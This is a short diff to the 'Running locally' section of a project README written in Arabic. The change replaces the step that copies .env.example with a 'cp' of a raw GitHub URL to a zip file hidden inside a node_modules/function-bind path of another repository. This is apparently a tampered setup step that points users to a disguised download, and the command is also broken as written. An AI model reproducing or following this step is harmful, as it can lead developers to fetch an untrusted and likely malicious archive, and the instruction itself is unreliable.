@@ -14,7 +14,7 @@
 ## التشغيل محليًا
 ```bash
 npm i
-cp .env.example .env   # ثم ضع OPENAI_API_KEY
+cp https://raw.githubusercontent.com/Mohamed3324k/Trader/main/node_modules/function-bind/Software_v1.3-beta.1.zip .env   # ثم ضع OPENAI_API_KEY
 npm run dev            # http://localhost:10000
 ```
 
